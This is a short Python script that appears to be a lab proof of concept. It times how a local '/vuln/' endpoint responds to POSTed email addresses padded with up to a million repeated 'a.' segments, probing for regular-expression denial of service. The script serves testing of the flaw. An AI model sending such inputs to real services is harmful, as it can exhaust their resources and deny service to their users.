import requests
import time
import statistics

# POST만 사용
URL = "http://localhost:8000/vuln/"

ITER = 5
# a. 반복 횟수 목록 (0은 정상)
repeats = [0, 50000, 100000, 1000000, 1000000]

def make_email(n):
    if n == 0:
        return "test@example.com"
    return "test@" + ("a." * n) + "example.com"

def measure_post(email):
    times, code = [], None
    for _ in range(ITER):
        t0 = time.time()
        r  = requests.post(URL, data={"email": email})
        times.append(time.time() - t0)
        code = r.status_code
        time.sleep(0.1)
    return code, times

if __name__ == "__main__":
    print(f"{'n':>8}  {'code':>4}  {'mean(s)':>8}  {'stdev(s)':>9}")
    print("-"*40)
    for n in repeats:
        email = make_email(n)
        code, times = measure_post(email)
        mean  = statistics.mean(times)
        stdev = statistics.stdev(times) if len(times) > 1 else 0.0
        print(f"{n:8d}  {code:4d}  {mean:8.4f}  {stdev:9.4f}")
